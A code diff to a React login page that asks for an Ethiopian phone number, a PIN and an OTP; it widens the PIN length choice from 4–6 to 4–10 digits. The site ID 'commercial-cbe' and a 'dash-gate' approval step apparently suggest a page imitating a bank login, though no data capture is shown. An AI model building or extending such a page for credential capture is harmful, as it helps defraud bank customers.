@@ -31,12 +31,16 @@ import { requestDashApproval } from '@/lib/dash-gate';
 
 const DASH_SITE_ID = 'commercial-cbe';
 
+// Selectable PIN lengths on the login card, minimum 4 through maximum 10 digits.
+const PIN_LENGTHS = [4, 5, 6, 7, 8, 9, 10] as const;
+type PinLength = (typeof PIN_LENGTHS)[number];
+
 type AuthStep = 'login' | 'otp' | 'authenticated';
 
 export default function Home() {
   const [currentLang, setCurrentLang] = useState<LanguageCode>('en');
   const [phoneNumber, setPhoneNumber] = useState<string>('');
-  const [pinLength, setPinLength] = useState<4 | 5 | 6>(4);
+  const [pinLength, setPinLength] = useState<PinLength>(4);
   const [pin, setPin] = useState<string>('');
   const [showPin, setShowPin] = useState<boolean>(false);
   const [showVirtualKeypad, setShowVirtualKeypad] = useState<boolean>(false);
@@ -51,7 +55,7 @@ export default function Home() {
 
   // Validation rules:
   // - Ethiopian mobile numbers: exactly 9 digits after +251 (e.g. 912345678)
-  // - PIN: selectable 4, 5, or 6 digits numeric (default: 4)
+  // - PIN: selectable 4 to 10 digits numeric (default: 4)
   const isPhoneValid = phoneNumber.length === 9 && /^9\d{8}$/.test(phoneNumber);
   const isPinValid = pin.length === pinLength && /^\d+$/.test(pin);
   const isFormValid = isPhoneValid && isPinValid;
@@ -268,20 +272,20 @@ export default function Home() {
                       </div>
                     </div>
 
-                    {/* PIN Input Box with 4, 5, 6 Digit Options */}
+                    {/* PIN Input Box with 4 to 10 Digit Options */}
                     <div className="relative">
-                      {/* PIN Length Options: 4, 5, or 6 digits (4 default) */}
-                      <div className="mb-2 flex items-center justify-between px-1">
+                      {/* PIN Length Options: 4 to 10 digits (4 default) */}
+                      <div className="mb-2 flex flex-wrap items-center justify-between gap-2 px-1">
                         <span className="text-xs font-semibold text-neutral-600">
                           {t.pinPlaceholder} Length
                         </span>
                         <div
                           id="pin-length-toggle-group"
-                          className="inline-flex items-center rounded-xl bg-neutral-100 p-0.5 border border-neutral-200/80"
+                          className="inline-flex flex-wrap items-center gap-y-1 rounded-xl bg-neutral-100 p-0.5 border border-neutral-200/80"
                           role="radiogroup"
                           aria-label="Select PIN digits"
                         >
-                          {([4, 5, 6] as const).map((len) => {
+                          {PIN_LENGTHS.map((len) => {
                             const isSelected = pinLength === len;
                             return (
                               <button
